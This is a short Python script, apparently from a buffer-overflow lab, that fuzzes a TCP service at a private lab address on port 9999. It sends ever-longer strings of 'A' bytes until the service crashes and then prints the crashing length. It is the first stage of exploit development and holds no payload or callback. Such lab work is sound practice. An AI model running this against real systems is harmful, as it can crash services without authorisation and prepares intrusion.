#!/usr/bin/python3
import socket, time, sys

host, port = "10.10.244.65", 9999
timeout = 5

payload = b"".join([
            b"A" * 400,
        ])
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host,port))
            s.recv(1024)
            print(f"Fuzzing with {len(payload)}")
            s.send(payload)
            s.recv(1024)
    except:
        print(f"Fuzzing crashed at {len(payload)}")
        sys.exit(0)
    payload += b"A" * 400
    time.sleep(1)
